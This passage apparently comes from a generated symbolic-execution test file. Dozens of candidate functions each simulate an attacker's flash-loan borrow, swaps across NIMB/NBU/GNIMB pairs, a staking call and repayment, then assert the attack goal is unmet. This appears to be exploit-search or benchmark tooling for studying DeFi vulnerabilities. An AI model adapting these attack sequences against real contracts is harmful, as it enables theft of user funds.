        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2616(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2617(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2618(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2619(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2620(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2621(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2622(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2623(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2624(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2625(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2626(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2627(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2628(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2629(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2630(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2631(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2632(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2633(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2634(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2635(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2636(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2637(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2638(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2639(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2640(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2641(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2642(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2643(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2644(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2645(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2646(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2647(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2648(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2649(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2650(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2651(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2652(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2653(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2654(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2655(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2656(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2657(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2658(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2659(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2660(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2661(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2662(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2663(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
